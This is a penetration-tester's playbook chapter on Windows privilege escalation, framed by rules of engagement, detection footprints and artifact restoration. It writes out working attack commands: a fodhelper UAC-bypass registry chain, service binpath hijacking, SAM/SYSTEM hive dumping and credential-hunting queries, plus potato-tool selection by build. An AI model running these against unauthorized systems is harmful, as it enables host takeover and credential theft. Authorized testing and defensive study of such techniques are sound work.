# 06 — Windows Privilege Escalation

**When to read:** On any Windows foothold with user-level context (from 04/05/08); whenever `whoami /groups` shows interesting SIDs or `whoami /priv` shows service-level privileges.
**Prerequisites:** Shell on in-scope Windows host; host fingerprint run first (checklists/host-fingerprint.md); EDR posture known (10 — determines on-host vs off-host technique choice).
**Primary ATT&CK mapping:** T1548.002 Bypass User Account Control, T1134 Access Token Manipulation, T1574 Hijack Execution Flow (T1574.001 DLL Search Order Hijacking, T1574.002 DLL Side-Loading), T1543.003 Windows Service, T1053.005 Scheduled Task, T1068 Exploitation for Privilege Escalation, T1552 Unsecured Credentials (local credential hunting), T1547.001 Registry Run Keys (persistence-class — route 09).

## Methodology (decision tree)

```text
Fingerprint host (build number! — decides potato family)
  → whoami /all: privileges + groups first (token table below)
  → service attack surface (perms, paths, binaries)
  → unattended/credential artifacts on disk
  → UAC context? (medium IL with admin group member → UAC bypass class)
  → kernel-dev only if all else fails (stability rule below)
```

**Build-number rule:** record `ver`/`[System.Environment]::OSVersion` output in the host fingerprint FIRST — the potato family and UAC-bypass validity are build-dependent. Firing the wrong potato at the wrong build = crash = availability incident (00).

## Phase 1 — Context enumeration

```cmd
whoami /all                     :: user, SID, groups (note: local Administrators *without* elevated token? = UAC context)
ver & systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
:: fingerprint set (full template in checklists/host-fingerprint.md)
netstat -ano | findstr ESTABLISHED
tasklist /v & schtasks /query /fo LIST /v
```

Seatbelt-class triage (on-host, EDR-visible — posture decision per 10): `Seatbelt.exe -group=all`; off-host alternative: registry + file reads via SMB (08 session) without on-host execution.

## Phase 2 — Token privilege abuse table (highest-yield first)

| Privilege | Meaning | Chain (per build) |
|---|---|---|
| `SeImpersonatePrivilege` (service accounts: IIS, WinRM, SQL agent...) | Impersonate clients | **Potato family → SYSTEM** (see build table) |
| `SeAssignPrimaryTokenPrivilege` | Create process tokens | Often present WITH SeImpersonate → potato paths |
| `SeBackupPrivilege` | Read any file (backup semantics) | `reg save hklm\sam`, `reg save hklm\system` → offline SAM dump → 08; `diskshadow` script to copy protected files (NTDS.dit on DC — with RoE approval class for DC-wide credential access) |
| `SeRestorePrivilege` | Write any file (incl. overwrite system files/owners) | Overwrite a service binary / set owners (findstr for writable-path synergy below) |
| `SeLoadDriverPrivilege` | Load kernel drivers | Known-vulnerable-driver abuse (BYOVD class — RoE-flagged: kernel = BSOD risk; lab-validated only) |
| `SeTakeOwnershipPrivilege` | Take file ownership | Own a service-binary file → replace → restart |
| `SeDebugPrivilege` | Open any process | Open LSASS → 08 (LSASS route); also dump SYSTEM processes |
| `SeManageVolumePrivilege` | Volume maintenance | Classic privesc via extended flags (`privescgate`-class public research) |

### Potato family by build (SeImpersonate → SYSTEM)

| Tool | Build validity | Prereqs |
|---|---|---|
| JuicyPotato | ≤ Win10 1809 / Server 2019 pre-patch | DCOM/NTLM local relay; dead on newer builds |
| SweetPotato / RoguePotato | Newer builds, needs relay helper | Remote listener for the relay leg (rogue class) |
| PrintSpoofer | 1903+ where spooler running | Local named-pipe spoofing, no remote leg — preferred when valid |
| GodPotato | 2012–2022 range when SeImpersonate present | Broadest current coverage |

Verify build → pick ONE → run → SYSTEM proof (screenshot with `whoami` = `nt authority\system`, 00 evidence rules). If it fails: do NOT brute-through variants — a failed potato often breaks the service context; fall to next class.

## Phase 3 — Service attack surface

```cmd
:: binary path + account
wmic service get name,pathname,startname /format:list | findstr /i "path" 
sc qc <svc>
:: unquoted paths (classic: C:\Program.exe hijack)
wmic service get pathname | findstr /v /i "c:\windows"     :: inspect anything unquoted with spaces
:: weak perms on service dirs/binaries (PowerUp-class checks)
powershell "Get-ChildItem 'C:\Program Files\<app>' -Recurse | Get-ChildItem | Select FullName,Attributes"
accesschk.exe -uwcqv "Users" *      :: services whose perms Users can change
:: service registry weakness
accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services\<svc>
:: weak service ACL → reconfigure
sc config <svc> binpath= "C:\path\to\your.exe" && sc stop <svc> && sc start <svc>   :: log the original binpath for close-out restore (15)
```

**Service-DLL hijack class:** `sc qc` shows a `ServiceDll` (svchost-hosted) → check write perms on the DLL or its directory → replace → restart. DLL hijack via search order (writable app dir ahead of system32) for apps auto-starting (route to 09 for persistence-class use).

Every reconfiguration = artifact → log original value + restore at close-out (15). No exceptions.

## Phase 4 — Credential artifacts (local, non-service escalation)

- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` (AutoAdminLogon/DefaultPassword — plaintext autologon).
- Unattended install files: `dir /s /b C:\*.xml` filtered to unattend/autounattend/sysprep.inf — usually contain local-admin credentials (T1552.001).
- Saved credentials: `cmdkey /list` + `runas /savecred` reuse class; Credential Manager blobs (DPAPI — decryption route 08).
- Browser/RCMan/.rdp files: keepass.config with embedded key paths, `.rdp` with alternate shell + saved sessions.
- PowerShell history: `%PSModuleAnalysisPath`? no — `ConsoleHost_history.txt` location; commands with embedded passwords.
- Findings class: stored-credential artifacts = reportable even when WEAK (misconfigured host with plaintext creds lying around is the client's real risk).

## Phase 5 — UAC bypass (medium → high IL)

Precondition: user IS in local Administrators but token is filtered (check `whoami /groups` for Mandatory Label\High vs Medium, and UAC policy `EnableLUA`). Classic chain (still-public, build-dependent):

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d ""
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "<your exe>"
start fodhelper.exe        :: executes your command at high IL
:: delete keys immediately after (close-out artifact log):
reg delete HKCU\Software\Classes\ms-settings /f
```

Alternatives by build: `computerdefaults.exe`, `sdclt` (elevated through control-panel verb). All = registry artifacts → log + delete (15). UAC bypass validity is heavily build/patch dependent — verify against build table before use; if patched, prefer a different escalation class over hammering.

## Phase 6 — Scheduled tasks / autoruns (user-writable action)

`schtasks /query /fo LIST /v` → tasks running as SYSTEM with user-writable action binaries (UnquotedPath + write = same as service class). Also: `C:\Windows\Tasks` legacy `.job` abuse. Route persistence-class use to 09.

## Phase 7 — Kernel exploitation (LAST resort — RoE-gated)

- Table by build-era of well-known public exploits (each with crash-risk label): Win10-era pool corruption class, ALPC-era, HiveNightmare/read-class (read-onlySAM/LSA — actually credential-READ class preferred when available: reads are far safer than corruption).
- **Stability rule:** kernel corruption exploits = BSOD risk = availability incident (00). Client-approved window + snapshot + crash-plan documented BEFORE run. Read-class primitives (e.g., HiveNightmare-class SAM copies under `C:\Windows\System32\config\` accessible due to permission misconfig) preferred — no corruption, same credential outcome → 08.

## Common failures / misreads

| Symptom | Misread | Reality check |
|---|---|---|
| `whoami /priv` shows SeImpersonate | "SYSTEM guaranteed" | Potato requires the client-connection pattern; printspoofer needs the spooler — check BOTH before firing |
| Service binPath looks writable | "Restart it" | Service restart failure = discovery + outage risk; verify service is safe-to-restart (client-approved host list) |
 fodhelper returns "This app can't open" | "Bypass patched" | Wrong key structure — DelegateExecute empty-string matters; re-check registry write landed |
| Unquoted path exists | "Instant SYSTEM" | Need WRITE to the hijack location AND service restart rights |
| Kernel exploit PoC "matches build" | "Fire it" | Patch level ≠ build number; check patch Tuesday mapping or use read-class first (crash rule above) |

## Detection footprint

- 4673/4674 (privileged service use), 7045 (service install — impacket psexec-class in 08 triggers the same), 4697 new services, Sysmon 1 (process creations: potato tool names), 13 (registry UAC-bypass writes — ms-settings key writes are a known alert), 11 (dropped binaries).
- EDR on-host: EVERY technique in this file that drops binaries will be scanned (10 for posture). Off-host alternatives (SMB/registry-only via 08 session) when posture requires.

## Tool fallback order

- Enumeration: Seatbelt-class > manual registry/file triage (no on-host execution when EDR posture is hostile).
- Services: native sc/wmic > PowerUp-class checks (module behavior, logging differs).
- Potato: build table decides — GodPotato/PrintSpoofer > Rogue/Sweet > Juicy (legacy builds).
- UAC: fodhelper > computerdefaults > sdclt (by build).
- Kernel: read-class first ALWAYS, corruption-class last (crash rule).

## Evidence handoff

Per escalation: before/after `whoami` screenshots (UTC clock in frame, 00), the exact commands used, every registry/file/service modification logged in `03-hosts/<host>/` with original values for close-out restore (15). Escalation path documented in attack-graph.md (00 case dir). If escalation used a misconfig (weak service ACL), the misconfig = the report finding, the escalation = the proof-of-impact (15 severity model).
